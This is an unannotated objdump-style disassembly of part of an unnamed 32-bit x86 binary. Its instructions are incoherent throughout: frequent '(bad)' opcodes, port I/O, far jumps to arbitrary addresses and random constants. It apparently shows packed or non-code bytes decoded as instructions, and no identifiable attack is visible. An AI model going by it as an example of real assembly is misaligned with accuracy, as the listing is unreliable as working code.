  40b123:	push   ecx
  40b124:	es push edx
  40b126:	js     0x40b0ac
  40b128:	stos   BYTE PTR es:[edi],al
  40b129:	cld    
  40b12a:	mov    al,ds:0xfe653c44
  40b12f:	(bad)
  40b132:	shr    DWORD PTR [eax-0x15cfb51a],1
  40b138:	jo     0x40b147
  40b13a:	ds fs int3 
  40b13d:	push   DWORD PTR [ebx-0x46]
  40b140:	pushf  
  40b141:	test   BYTE PTR cs:[ebp+0x53dfc6cb],0x9f
  40b149:	test   DWORD PTR [ebp+0x6a],ebx
  40b14c:	fsub   QWORD PTR [esi-0x68db3cd5]
  40b152:	adc    DWORD PTR [edi-0x49],0x3070e69b
  40b159:	pop    es
  40b15a:	aad    0x42
  40b15c:	add    DWORD PTR [esi],eax
  40b15e:	jmp    0x40b133
  40b160:	ja     0x40b122
  40b162:	dec    eax
  40b163:	cmp    ch,dh
  40b165:	add    bl,BYTE PTR [ebx-0x3c]
  40b168:	sub    al,0xa
  40b16a:	pusha  
  40b16b:	sbb    DWORD PTR [edi],ecx
  40b16d:	sti    
  40b16e:	js     0x40b1e1
  40b170:	mov    edx,?
  40b172:	dec    ebx
  40b173:	mov    edi,0x69db1169
  40b178:	aas    
  40b179:	push   ebx
  40b17a:	fld    QWORD PTR [ecx+0x5868acef]
  40b180:	pop    esp
  40b181:	out    0xe0,eax
  40b183:	stc    
  40b184:	pusha  
  40b185:	inc    ebp
  40b186:	pop    ebp
  40b187:	cwde   
  40b188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b189:	pushw  ds
  40b18b:	or     dl,ah
  40b18d:	out    0x27,eax
  40b18f:	sahf   
  40b190:	call   0xfed09bc7
  40b195:	out    0x7c,eax
  40b197:	inc    ebx
  40b198:	outs   dx,BYTE PTR ds:[esi]
  40b199:	xlat   BYTE PTR ds:[ebx]
  40b19a:	and    al,0xcd
  40b19c:	adc    BYTE PTR [ebp+0x67],ch
  40b19f:	(bad)  
  40b1a0:	(bad)  
  40b1a2:	inc    esp
  40b1a3:	scas   al,BYTE PTR es:[edi]
  40b1a4:	or     DWORD PTR [ecx],esp
  40b1a6:	mov    ecx,DWORD PTR [edx]
  40b1a8:	jmp    0xd4d56d4a
  40b1ad:	rol    ecx,cl
  40b1af:	test   DWORD PTR [edx],edx
  40b1b1:	mov    bl,0xeb
  40b1b3:	jle    0x40b1f3
  40b1b5:	add    eax,DWORD PTR [edi-0x32]
  40b1b8:	mov    ss,WORD PTR [eax-0x182ecf86]
  40b1be:	ss dec esp
  40b1c0:	nop
  40b1c1:	push   0x3686e5e7
  40b1c6:	rcl    bh,0x61
  40b1c9:	call   0xb3932bfa
  40b1ce:	fisttp WORD PTR [esi+0x3]
  40b1d1:	sbb    BYTE PTR [edx-0x45],bh
  40b1d4:	push   ds
  40b1d5:	(bad)  
  40b1d6:	fincstp 
  40b1d8:	retf   0xbc38
  40b1db:	call   0x82da:0xa3edbffe
  40b1e2:	js     0x40b24e
  40b1e4:	cs daa 
  40b1e6:	pop    edx
  40b1e7:	adc    al,0x6e
  40b1e9:	je     0x40b1ef
  40b1eb:	imul   ah
  40b1ed:	mov    edx,0x9e2b843c
  40b1f2:	mov    ebx,0xe2173ee4
  40b1f7:	sbb    dh,al
  40b1f9:	jl     0x40b24f
  40b1fb:	mov    bl,0x4b
  40b1fd:	jecxz  0x40b23d
  40b1ff:	jmp    0x40b1a9
  40b201:	add    ebp,DWORD PTR [eax]
  40b203:	stos   BYTE PTR es:[edi],al
  40b204:	mov    edi,0x4097974b
  40b209:	out    dx,eax
  40b20a:	pop    ebp
  40b20b:	and    al,0x6
  40b20d:	pop    eax
  40b20e:	inc    edx
  40b20f:	test   dh,bl
  40b211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b212:	(bad)  
  40b214:	push   edx
  40b215:	and    bh,dh
  40b217:	test   edi,ecx
  40b219:	nop
  40b21a:	sar    BYTE PTR [esi],0x39
  40b21d:	(bad)  
  40b21e:	jle    0x40b1a5
  40b220:	xor    DWORD PTR [eax+0x25],0xffffffa8
  40b224:	test   DWORD PTR [ecx+0x59],eax
  40b227:	mov    DWORD PTR fs:[edx],edx
  40b22a:	neg    DWORD PTR [ebp-0x64]
  40b22d:	mov    al,ds:0xf45a83c4
  40b232:	jmp    0x3b581f44
  40b237:	inc    edi
  40b238:	cmp    al,0x39
  40b23a:	xchg   DWORD PTR [ebx],edx
  40b23c:	cmp    ebp,DWORD PTR [edx+0x3d]
  40b23f:	pusha  
  40b240:	inc    ecx
  40b241:	sti    
  40b242:	mov    al,ds:0x81ad3ffc
  40b247:	scas   al,BYTE PTR es:[edi]
  40b248:	or     eax,0x747f5474
  40b24d:	push   edi
  40b24e:	pop    ebx
  40b24f:	add    BYTE PTR [edi],dh
  40b251:	mov    edx,0xfc78fecc
  40b256:	adc    eax,0xe8f58c85
  40b25b:	xor    eax,0x6d346f3f
  40b260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b261:	and    eax,0xe6a22b93
  40b266:	mov    al,0xcd
  40b268:	mov    bl,dh
  40b26a:	push   0x53f3fac8
  40b26f:	fcom   DWORD PTR [eax]
  40b271:	push   0x5c
  40b273:	(bad)  
  40b274:	jnp    0x40b24d
  40b276:	repz sar ecx,cl
  40b279:	in     al,dx
  40b27a:	add    cl,al
  40b27c:	cmc    
  40b27d:	xor    eax,0xa4020448
  40b282:	cdq    
  40b283:	test   DWORD PTR [ecx+0x49392aa6],esi
  40b289:	std    
  40b28a:	pop    edx
  40b28b:	jbe    0x40b26d
  40b28d:	xchg   esp,eax
  40b28e:	push   0x5c
  40b290:	xor    al,0x4b
  40b292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b293:	test   DWORD PTR [esi],ebp
  40b295:	dec    esi
  40b296:	or     ebp,DWORD PTR [ebx-0x481cad22]
  40b29c:	mov    edx,0xc48c5bbf
  40b2a1:	in     eax,dx
  40b2a2:	retf   
  40b2a3:	push   0x93d8ac1a
  40b2a8:	aas    
  40b2a9:	popf   
  40b2aa:	dec    edx
  40b2ab:	rcr    DWORD PTR [esi-0x57],cl
  40b2ae:	inc    eax
  40b2af:	inc    ebp
  40b2b0:	in     eax,dx
  40b2b1:	out    0x25,al
  40b2b3:	cli    
  40b2b4:	fbld   TBYTE PTR [eax]
  40b2b6:	mov    dl,al
  40b2b8:	sub    bl,ch
  40b2ba:	and    bh,BYTE PTR [edi+ecx*4]
  40b2bd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b2bf:	lods   eax,DWORD PTR ds:[esi]
  40b2c0:	fisttp DWORD PTR [ecx-0x4ec08326]
  40b2c6:	xchg   ebx,eax
  40b2c7:	cmp    DWORD PTR [eax+ecx*4],ecx
  40b2ca:	dec    DWORD PTR [edi]
  40b2cc:	dec    esi
  40b2cd:	out    0x22,al
  40b2cf:	rcl    DWORD PTR [ecx],cl
  40b2d1:	std    
  40b2d2:	mov    ecx,0xe1bceca6
  40b2d7:	lock or edx,DWORD PTR [edi]
  40b2da:	pop    ebx
  40b2db:	int3   
  40b2dc:	js     0x40b2bb
  40b2de:	pop    esp
  40b2df:	pop    esi
  40b2e0:	test   BYTE PTR [edx+edi*8],bl
  40b2e3:	test   DWORD PTR [edx],esi
  40b2e5:	popa   
  40b2e6:	test   al,0x5d
  40b2e8:	ds mov cl,0x86
  40b2eb:	jp     0x40b2dc
  40b2ed:	outs   dx,BYTE PTR ds:[esi]
  40b2ee:	pop    esi
  40b2ef:	mov    WORD PTR [esi+eiz*8-0xe],ds
  40b2f3:	push   esp
  40b2f4:	adc    eax,0x35e3740e
  40b2f9:	sbb    edx,DWORD PTR ds:0x55526b16
  40b2ff:	data16 aas 
  40b301:	daa    
  40b302:	push   ecx
  40b303:	mov    ebx,0x5f72e744
  40b308:	arpl   WORD PTR [ebx],dx
  40b30a:	and    ebp,ebx
  40b30c:	addr16 pop ebx
  40b30e:	lds    edi,FWORD PTR [ecx+ebp*1]
  40b311:	jno    0x40b367
  40b313:	mov    eax,0x4db86603
  40b318:	rol    ecx,cl
  40b31a:	push   es
  40b31b:	mov    ch,0xd8
  40b31d:	int    0x8f
  40b31f:	test   bl,cl
  40b321:	mov    dl,0x1e
  40b323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b324:	aas    
  40b325:	daa    
  40b326:	rol    BYTE PTR [esi+esi*4],1
  40b329:	dec    edx
  40b32a:	mov    ds:0xeae66e56,eax
  40b32f:	inc    ecx
  40b330:	push   esp
  40b331:	ret    0xfc8f
  40b334:	inc    esp
  40b335:	and    BYTE PTR [ebp+0x5a790d09],dl
  40b33b:	fs sub al,cl
  40b33e:	xchg   BYTE PTR [ebx],bh
  40b340:	loopne 0x40b2c4
  40b342:	cdq    
  40b343:	pushf  
  40b344:	out    0x11,al
  40b346:	outs   dx,DWORD PTR ds:[esi]
  40b347:	jns    0x40b337
  40b349:	les    ebx,FWORD PTR [ecx-0x60]
  40b34c:	push   es
  40b34d:	retf   
  40b34e:	dec    eax
  40b34f:	cmp    ah,cl
  40b351:	out    0xc2,al
  40b353:	add    DWORD PTR [edx],eax
  40b355:	push   edi
  40b356:	xor    ah,bh
  40b358:	data16 fadd DWORD PTR [ebx-0x2f]
  40b35c:	std    
  40b35d:	jnp    0x40b3b2
  40b35f:	stos   BYTE PTR es:[edi],al
  40b360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b362:	xlat   BYTE PTR ds:[ebx]
  40b363:	xor    edx,DWORD PTR [ebx+0xf328ce4]
  40b369:	xchg   esp,eax
  40b36a:	inc    esi
  40b36b:	sahf   
  40b36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b36d:	cmovae ebp,ebp
  40b370:	ds jmp 0x40b3c8
  40b373:	sub    eax,0xee48ab86
  40b378:	pusha  
  40b379:	out    0x56,eax
  40b37b:	push   esi
  40b37c:	repz or esp,eax
  40b37f:	xor    BYTE PTR [edx-0x22],ch
  40b382:	cmp    al,bh
  40b384:	mov    bl,0xab
  40b386:	pop    ebx
  40b387:	or     al,0xd3
  40b389:	pop    ss
  40b38a:	(bad)  
  40b38b:	retf   
  40b38c:	es cmc 
  40b38e:	jp     0x40b314
  40b390:	mov    ebx,0x3ee85c5e
  40b395:	stos   DWORD PTR es:[edi],eax
  40b396:	adc    dh,BYTE PTR [edx]
  40b398:	dec    esi
  40b399:	ret    0xd10d
  40b39c:	out    0xe7,eax
  40b39e:	fisubr DWORD PTR [edx+0x6f]
  40b3a1:	mov    al,dl
  40b3a3:	jne    0x40b3df
  40b3a5:	add    eax,0xdffe8a7
  40b3aa:	inc    edi
  40b3ab:	add    ch,al
  40b3ad:	cs jno 0x40b334
  40b3b0:	imul   esp,esi,0xc167422a
  40b3b6:	cmp    bh,BYTE PTR es:[ebp-0x20871f8c]
  40b3bd:	add    eax,0xcdb7f806
  40b3c2:	push   ebp
  40b3c3:	adc    al,0x40
  40b3c5:	daa    
  40b3c6:	aas    
  40b3c7:	mov    ?,WORD PTR [ebx-0xb]
  40b3ca:	push   0x5f
  40b3cc:	inc    ebx
  40b3cd:	das    
  40b3ce:	inc    edi
  40b3cf:	ficom  WORD PTR [esi-0x3d]
  40b3d2:	pop    ebx
  40b3d3:	dec    esi
  40b3d4:	cmp    bl,bh
  40b3d6:	stos   BYTE PTR es:[edi],al
  40b3d7:	jle    0x40b390
  40b3d9:	xchg   esi,eax
  40b3da:	pushaw 
  40b3dc:	(bad)  
  40b3dd:	aas    
  40b3de:	pushf  
  40b3df:	inc    esp
  40b3e0:	xor    al,0x65
  40b3e2:	loop   0x40b368
  40b3e4:	jmp    0x4d186921
  40b3e9:	mov    DWORD PTR [eax],esp
  40b3eb:	cmp    DWORD PTR [eax],edx
  40b3ed:	jns    0x40b418
  40b3ef:	test   BYTE PTR [ebp-0x6d2665f4],ch
  40b3f5:	fidivr WORD PTR [esi+0x61]
  40b3f8:	test   BYTE PTR [edi+ebp*4+0x21],ah
  40b3fc:	pop    ds
  40b3fd:	aam    0x46
  40b3ff:	pop    ebx
  40b400:	in     al,dx
  40b401:	outs   dx,BYTE PTR ds:[esi]
  40b402:	das    
  40b403:	inc    esp
  40b404:	(bad)  
  40b405:	call   0xd837646f
  40b40a:	fisub  DWORD PTR [ebp+0x6c48e6e3]
  40b410:	pop    edx
  40b411:	ret    
  40b412:	inc    ebx
  40b413:	sbb    al,BYTE PTR [ecx-0x233b5fe9]
  40b419:	popa   
  40b41a:	pop    edx
  40b41b:	neg    BYTE PTR [esi+0x12]
  40b41e:	adc    al,0x6e
  40b420:	ret    0x2ca7
  40b423:	test   DWORD PTR [edx-0x73],edx
  40b426:	or     DWORD PTR [edx-0x2a8894cf],ecx
  40b42c:	sbb    BYTE PTR [edi-0x42],al
  40b42f:	ret    0x37b8
  40b432:	mov    ebp,0x4077f5b
  40b437:	adc    eax,0x99c7ed70
  40b43c:	jg     0x40b4af
  40b43e:	mov    esi,0x32b274c5
  40b443:	jbe    0x40b4a6
  40b445:	xlat   BYTE PTR ds:[ebx]
  40b446:	pop    edx
  40b447:	xchg   BYTE PTR [ebp-0x6ba6a80e],cl
  40b44d:	dec    esi
  40b44e:	xor    al,0x85
  40b450:	ins    DWORD PTR es:[edi],dx
  40b451:	pop    ebx
  40b452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b453:	popa   
  40b454:	aas    
  40b455:	rcr    DWORD PTR [eax+0x22],1
  40b458:	push   edi
  40b459:	or     edi,DWORD PTR [ecx]
  40b45b:	xchg   ebx,eax
  40b45c:	mov    ch,ch
  40b45e:	retf   0x2791
  40b461:	add    DWORD PTR ds:0xd54a3b90,esp
  40b467:	test   BYTE PTR [edi],bh
  40b469:	test   eax,0x1005bbfd
  40b46e:	and    dl,dh
  40b470:	pop    esi
  40b471:	out    0x6a,eax
  40b473:	or     al,0x7b
  40b475:	sar    ah,0x12
  40b478:	dec    edx
  40b479:	or     dh,BYTE PTR [edi+0x4e]
  40b47c:	ds pop es
  40b47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b47f:	adc    BYTE PTR [ebp-0x45],al
  40b482:	mov    ebp,0xcaf133db
  40b487:	or     eax,0xb8f7b70f
  40b48c:	fcmovnbe st,st(1)
  40b48e:	pop    ebx
  40b48f:	bound  eax,QWORD PTR [ecx-0xd]
  40b492:	(bad)  
  40b493:	mov    bh,0x8a
  40b495:	addr16 call 0xb41f:0x54721e84
  40b49d:	pop    ss
  40b49e:	sbb    eax,0xf9af6d85
  40b4a3:	mov    ds:0xa7dfc33f,al
  40b4a8:	(bad)  
  40b4a9:	pop    ebx
  40b4aa:	aad    0xf6
  40b4ac:	fsubr  st(7),st
  40b4ae:	in     al,dx
  40b4af:	and    eax,0xecd79d07
  40b4b4:	shl    DWORD PTR [edi+0x71],cl
  40b4b7:	mov    ds:0x6454da87,al
  40b4bc:	inc    edx
  40b4bd:	sbb    al,0x14
  40b4bf:	and    esp,esp
  40b4c1:	xchg   ecx,eax
  40b4c2:	pop    edx
  40b4c3:	inc    eax
  40b4c4:	jmp    edi
  40b4c6:	mov    cs,WORD PTR [ebp+0x5086153a]
  40b4cc:	cld    
  40b4cd:	sub    bl,BYTE PTR [eax+0x53]
  40b4d0:	pop    esp
  40b4d1:	cld    
  40b4d2:	pop    ebx
  40b4d3:	mov    eax,0x4cf5efbe
  40b4d8:	es in  eax,dx
  40b4da:	test   BYTE PTR [eax+ebp*2+0x3ff0a28c],al
  40b4e1:	test   eax,0xe5f816c4
  40b4e6:	fidivr WORD PTR [esi]
  40b4e8:	xlat   BYTE PTR ds:[ebx]
  40b4e9:	out    0x38,eax
  40b4eb:	in     eax,0x26
  40b4ed:	cli    
  40b4ee:	xchg   DWORD PTR [ecx+0x4d],esp
  40b4f1:	push   0xffffff93
  40b4f3:	dec    esp
  40b4f4:	fsubr  QWORD PTR [ecx]
  40b4f6:	pop    ebx
  40b4f7:	ret    0x547b
  40b4fa:	inc    esi
  40b4fb:	(bad)  
  40b4fc:	mov    al,ds:0xd9853349
  40b501:	xchg   ebp,eax
  40b502:	shl    BYTE PTR [ecx],cl
  40b504:	ds scas eax,DWORD PTR es:[edi]
  40b506:	mov    ds:0x2dadb68a,al
  40b50b:	js     0x40b495
  40b50d:	push   edi
  40b50e:	inc    esi
  40b50f:	or     DWORD PTR [eax],edi
  40b511:	mov    ebx,0xd4ada00c
  40b516:	je     0x40b571
  40b518:	mov    bl,0x14
  40b51a:	sbb    eax,DWORD PTR [edi+0x3e]
  40b51d:	xchg   ebp,eax
  40b51e:	cmp    ebx,DWORD PTR [ebx]
  40b520:	xchg   ebx,eax
  40b521:	inc    ebx
  40b522:	xchg   edx,eax
  40b523:	pop    esi
  40b524:	enter  0x4c97,0x8d
  40b528:	ds jecxz 0x40b4ac
  40b52b:	mov    esi,0x6cb1695
  40b530:	and    ch,cl
  40b532:	xchg   DWORD PTR [edi-0x62],ecx
  40b535:	rol    BYTE PTR [bx+di+0x5354],0xe9
  40b53b:	add    BYTE PTR [bx+di-0x7e74],ah
  40b540:	xchg   esp,eax
  40b541:	repz mov edx,esp
  40b544:	repz fnsave ds:[edi-0x45fcf99b]
  40b54c:	mul    DWORD PTR [edi]
  40b54e:	dec    edi
  40b54f:	jb     0x40b565
  40b551:	mov    ch,0xa8
  40b553:	fwait
  40b554:	(bad)  
  40b555:	call   0x64cb487a
  40b55a:	adc    al,0x87
  40b55c:	add    BYTE PTR [ebx-0x6e09a1a7],dl
  40b562:	stos   BYTE PTR es:[edi],al
  40b563:	sbb    bh,al
  40b565:	xor    edi,DWORD PTR [ebx-0x7b492369]
  40b56b:	test   DWORD PTR [edi+0x3f1502d6],ebx
  40b571:	repz sub ah,BYTE PTR [eax+0x36351c51]
  40b578:	dec    ecx
  40b579:	out    0x7a,eax
  40b57b:	push   0xcd3a24c6
  40b580:	dec    eax
  40b581:	fidiv  DWORD PTR [ebp-0x78d2c04e]
  40b587:	dec    ebx
  40b588:	lds    esi,FWORD PTR [ebx]
  40b58a:	mov    WORD PTR [esp+ecx*4],?
  40b58d:	xor    esp,DWORD PTR ds:0xc0e16a1a
  40b593:	imul   edi,DWORD PTR [eax-0x1d],0xffffffb5
  40b597:	add    eax,0x302e4ed
  40b59c:	jge    0x40b591
  40b59e:	rep ins BYTE PTR es:[edi],dx
  40b5a0:	cmp    bl,BYTE PTR fs:[edx+0x24]
  40b5a4:	inc    ecx
  40b5a5:	into   
  40b5a6:	add    al,0x43
  40b5a8:	call   FWORD PTR [edx]
  40b5aa:	or     eax,0x91cd6e4
  40b5af:	cmc    
  40b5b0:	mov    al,BYTE PTR [esi+0x5b]
  40b5b3:	hlt    
  40b5b4:	sub    DWORD PTR [ebx+0x4c],ecx
  40b5b7:	rep stos DWORD PTR es:[edi],eax
  40b5b9:	push   es
  40b5ba:	arpl   WORD PTR [edx+0x6e],di
  40b5bd:	(bad)  
  40b5be:	fisubr DWORD PTR [esi-0x14]
  40b5c1:	jg     0x40b637
  40b5c3:	dec    eax
  40b5c4:	ss mov cl,0x3f
  40b5c7:	or     BYTE PTR [ecx],dl
  40b5c9:	push   di
  40b5cb:	dec    edx
  40b5cc:	int3   
  40b5cd:	stc    
  40b5ce:	call   DWORD PTR [ebp+0x76]
  40b5d1:	jno    0x40b628
  40b5d3:	sbb    al,0xd1
  40b5d5:	cmc    
  40b5d6:	shl    ebx,0xbf
  40b5d9:	lock cli 
  40b5db:	sub    eax,0xfb19b57e
  40b5e0:	push   ecx
  40b5e1:	sti    
  40b5e2:	pop    edx
  40b5e3:	xor    eax,0x1abd49c2
  40b5e8:	out    0x2c,al
  40b5ea:	imul   edx,DWORD PTR [esi+0x45f69e9e],0x38
  40b5f1:	lahf   
  40b5f2:	sub    ecx,DWORD PTR [ebp-0x67]
  40b5f5:	push   ecx
  40b5f6:	push   es
  40b5f7:	sub    DWORD PTR [edx],ebp
  40b5f9:	jmp    0xf859:0xaa6a15a
  40b600:	sub    eax,0xac8a154e
  40b605:	out    0xea,al
  40b607:	jns    0x40b630
  40b609:	pop    esp
  40b60a:	pop    eax
  40b60b:	mov    ?,WORD PTR [edi]
  40b60d:	add    DWORD PTR [eax+esi*4-0x2a],eax
  40b611:	int3   
  40b612:	pop    edx
  40b613:	xor    ch,ch
  40b615:	cli    
  40b616:	mov    ebp,0xa1024ca1
  40b61b:	mov    ebx,0x87831bc4
  40b620:	sti    
  40b621:	outs   dx,DWORD PTR ds:[esi]
  40b622:	xchg   edi,eax
  40b623:	pop    es
  40b624:	ds push ecx
  40b626:	cdq    
  40b627:	fimul  DWORD PTR [edx+ebp*8]
  40b62a:	in     eax,0x39
  40b62c:	repz out 0xda,eax
  40b62f:	mov    ch,0x97
  40b631:	mov    bl,0x3a
  40b633:	cmp    eax,0xec2a611a
  40b638:	jl     0x40b64c
  40b63a:	inc    esi
  40b63b:	or     BYTE PTR [edx+ecx*2-0x1e8a3be3],bl
  40b642:	clc    
  40b643:	fs hlt 
  40b645:	test   BYTE PTR [ebx],ah
  40b647:	xor    al,0x30
  40b649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b64a:	or     cl,cl
  40b64c:	aad    0x2
  40b64e:	mov    ebp,0xaa6d3ff8
  40b653:	mov    ebx,DWORD PTR [esi]
  40b655:	not    DWORD PTR [ecx]
  40b657:	stos   BYTE PTR es:[edi],al
  40b658:	dec    eax
  40b659:	stc    
  40b65a:	and    al,0xdb
  40b65c:	cmc    
  40b65d:	mov    BYTE PTR [esp+edx*2-0x41],bl
  40b661:	scas   eax,DWORD PTR es:[edi]
  40b662:	add    al,0xd7
  40b664:	out    0x49,al
  40b666:	dec    esp
  40b667:	test   al,0x2a
  40b669:	and    BYTE PTR [ebp+0x70],dl
  40b66c:	(bad)  
  40b66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b66e:	pushf  
  40b66f:	and    dl,BYTE PTR [ecx-0x8]
  40b672:	xchg   esp,eax
  40b673:	adc    al,0x37
  40b675:	popa   
  40b676:	bound  edi,QWORD PTR ss:[edi-0x4f477994]
  40b67d:	lds    eax,FWORD PTR [ebx]
  40b67f:	mov    ebx,0x4c5b18e7
  40b684:	test   eax,0x4a6d75ce
  40b689:	sbb    dh,BYTE PTR [eax]
  40b68b:	test   DWORD PTR [eax+0x3cbe3c6f],ebx
  40b691:	icebp  
  40b692:	(bad)
  40b695:	mov    BYTE PTR [ecx+0x3736f56b],cl
  40b69b:	fistp  QWORD PTR [esi+0x125788ba]
  40b6a1:	cmp    BYTE PTR [eax-0x7f],ah
  40b6a4:	xchg   ebx,eax
  40b6a5:	dec    ebp
  40b6a6:	mov    ecx,0x9bb9ad63
  40b6ab:	pop    ebx
  40b6ac:	jmp    0xfc3f:0x7ea659b3
  40b6b3:	mov    eax,ds:0x7fca9ed5
  40b6b8:	ds jmp 0x49bf:0x12700865
  40b6c0:	cmp    al,0xd5
  40b6c2:	sub    eax,edi
  40b6c4:	ja     0x40b6f5
  40b6c6:	pop    es
  40b6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6c8:	scas   al,BYTE PTR es:[edi]
  40b6c9:	or     al,0x1e
  40b6cb:	scas   al,BYTE PTR es:[edi]
  40b6cc:	sub    al,0xd3
  40b6ce:	ret    
  40b6cf:	test   eax,ebx
  40b6d1:	cmp    al,0x17
  40b6d3:	cdq    
  40b6d4:	inc    ecx
  40b6d5:	or     DWORD PTR [edi-0x4],esi
  40b6d8:	mov    ch,0xc5
  40b6da:	lea    eax,[ebp+0x16c1acaa]
  40b6e0:	call   0xb8b37bcc
  40b6e5:	mov    ecx,0xdd39641c
  40b6ea:	and    WORD PTR [ebx+0x34],dx
  40b6ee:	pop    eax
  40b6ef:	fiadd  WORD PTR [ebp-0x4f]
  40b6f2:	cli    
  40b6f3:	jns    0x40b772
  40b6f5:	out    0xca,eax
  40b6f7:	ret    
  40b6f8:	into   
  40b6f9:	and    eax,0x667dbce2
  40b6fe:	fild   QWORD PTR [ebp-0x2fa4aab7]
  40b704:	jmp    0x94dcf1b1
  40b709:	cli    
  40b70a:	out    0x85,eax
  40b70c:	outs   dx,DWORD PTR ds:[esi]
  40b70d:	stc    
  40b70e:	retf   
  40b70f:	mov    al,0xd7
  40b711:	sbb    ecx,ecx
  40b713:	enter  0xd53e,0xa3
  40b717:	(bad)  
  40b719:	cmp    DWORD PTR [eax],0xfffffff5
  40b71c:	sahf   
  40b71d:	out    0xa2,eax
  40b71f:	repnz pop esi
  40b721:	fstp   QWORD PTR [esi+0x35caff57]
  40b727:	xor    edi,DWORD PTR [edi]
  40b729:	ins    DWORD PTR es:[edi],dx
  40b72a:	cmp    dl,BYTE PTR [edi+0x3d]
  40b72d:	add    ch,BYTE PTR [esi+0x6e7dfc4]
  40b733:	ins    BYTE PTR es:[edi],dx
  40b734:	mov    al,dh
  40b736:	dec    edi
  40b737:	cmp    esi,ecx
  40b739:	pop    es
  40b73a:	shr    DWORD PTR [ebx-0x31a5c0d7],0x4c
  40b741:	mov    ebp,0x34d09d29
  40b746:	adc    al,0x85
  40b748:	ficom  WORD PTR [ecx-0x3eb8e608]
  40b74e:	cs sbb al,0x3e
  40b751:	jge    0x40b7cd
  40b753:	or     BYTE PTR gs:[edx-0x1881fcb0],bl
  40b75a:	retf   0x933a
  40b75d:	(bad)  
  40b75e:	js     0x40b788
  40b760:	loopne 0x40b731
  40b762:	test   eax,0xa9533fc7
  40b767:	in     al,dx
  40b768:	ja     0x40b7dd
  40b76a:	add    eax,0x4ee64281
  40b76f:	push   0x9122f9eb
  40b774:	sar    esi,cl
  40b776:	and    eax,0x64eb34a3
  40b77b:	not    BYTE PTR [edx+0x1a81db17]
  40b781:	in     eax,dx
  40b782:	pusha  
  40b783:	pop    ecx
  40b784:	fs push esp
  40b786:	fdivr  st(3),st
  40b788:	sub    DWORD PTR [edi-0x6ccf7b22],esp
  40b78e:	enter  0x56e7,0xb3
  40b792:	outs   dx,BYTE PTR ds:[esi]
  40b793:	or     DWORD PTR [ecx+0x20],esp
  40b796:	mov    ebp,0xf02d3cb
  40b79b:	xchg   ebp,eax
  40b79c:	mov    edx,0x23969d66
  40b7a1:	scas   al,BYTE PTR es:[edi]
  40b7a2:	dec    edi
  40b7a3:	xchg   esi,eax
  40b7a4:	jne    0x40b80c
  40b7a6:	xchg   ebp,eax
  40b7a7:	in     eax,0x72
  40b7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7aa:	aad    0xa3
  40b7ac:	sbb    ah,bl
  40b7ae:	pop    eax
  40b7af:	sbb    BYTE PTR [edi-0x11fa5071],cl
  40b7b5:	jmp    0xc9135554
  40b7ba:	imul   DWORD PTR [edx]
  40b7bc:	in     al,0x22
  40b7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7bf:	add    al,0x3e
  40b7c1:	jmp    0x40b7da
  40b7c3:	ins    DWORD PTR es:[edi],dx
  40b7c4:	inc    esp
  40b7c5:	jnp    0x40b83f
  40b7c7:	(bad)  
  40b7c8:	mov    ebp,0xa82652e7
  40b7cd:	shr    DWORD PTR [edi+0x71a473bd],0x10
  40b7d4:	mov    edx,0x9d9e48f0
  40b7d9:	sbb    eax,0x9cc185fb
  40b7de:	adc    al,0xa
  40b7e0:	add    DWORD PTR [ebp+0x49],eax
  40b7e3:	arpl   sp,bx
  40b7e5:	repz jge 0x40b76d
  40b7e8:	lods   al,BYTE PTR ds:[esi]
  40b7e9:	xchg   esi,eax
  40b7ea:	es and eax,0x6624e797
  40b7f0:	xchg   edx,eax
  40b7f1:	cmp    eax,0x9d9ca98e
  40b7f6:	cmp    WORD PTR ss:[ebp+eiz*4+0x10],ax
  40b7fc:	pop    ebp
  40b7fd:	pcmpgtb mm6,QWORD PTR [ebp+ebp*1-0x65]
  40b802:	sub    dh,BYTE PTR [ebx]
  40b804:	sub    BYTE PTR [edi+0x5c],bh
  40b807:	into   
  40b808:	bound  edx,QWORD PTR [edi+0x45]
  40b80b:	int3   
  40b80c:	shl    ebp,cl
  40b80e:	mov    eax,0xa39d156
  40b813:	pop    edi
  40b814:	mov    edi,0xd7fdc731
  40b819:	cli    
  40b81a:	retf   
  40b81b:	out    0x9e,eax
  40b81d:	out    0x21,eax
  40b81f:	jl     0x40b82b
  40b821:	sbb    edi,edi
  40b823:	or     eax,0x9fc811a2
  40b828:	inc    eax
  40b829:	pop    es
  40b82a:	dec    edx
  40b82b:	test   al,dh
  40b82d:	std    
  40b82e:	adc    edi,DWORD PTR [eax-0x9]
  40b831:	or     dh,BYTE PTR [ebp+edx*8-0x7a]
  40b835:	xor    al,BYTE PTR [esi+0x8]
  40b838:	stc    
  40b839:	add    al,0xd2
  40b83b:	inc    esp
  40b83c:	scas   eax,DWORD PTR es:[edi]
  40b83d:	out    0xb2,eax
  40b83f:	and    edi,ebx
  40b841:	ss sbb eax,0xc4dbf139
  40b847:	mov    al,ds:0xe8629a59
  40b84c:	loop   0x40b874
  40b84e:	pop    esp
  40b84f:	(bad)  [edi+0x7]
  40b852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b853:	hlt    
  40b854:	pop    esp
  40b855:	pop    ebp
  40b856:	rol    BYTE PTR [ebp+ebp*8+0x2304a8ea],0x6f
  40b85e:	or     al,0xc8
  40b860:	lods   al,BYTE PTR ds:[esi]
  40b861:	in     ax,0x1
  40b864:	xchg   edi,eax
  40b865:	adc    eax,0xde1235a5
  40b86a:	aad    0x87
  40b86c:	adc    BYTE PTR [ebx-0x61],ch
  40b86f:	jnp    0x40b875
  40b871:	gs or  ch,al
  40b874:	xlat   BYTE PTR ds:[ebx]
